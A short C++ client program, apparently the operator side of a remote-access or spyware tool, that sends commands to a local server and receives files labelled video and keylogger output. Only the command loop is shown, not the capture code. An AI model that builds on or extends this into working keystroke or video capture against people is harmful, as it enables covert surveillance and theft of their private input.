#include "client.h"

int main()
{
    Client client;
    client.Init("localhost", "27015");

    while (true)
    {
        client.GetCommand();
        if (client.command == "EXIT")
            break;
        client.SendCommand();
        if (client.command == "GET_VIDEO")
        {
            client.ReceiveFile("../src/data/video");
        }
        else if(client.command == "GET_KEYLOGGER")
        {
            client.ReceiveFile("../src/data/keylogger");
        }
    }

    client.Shutdown();
    return 0;
}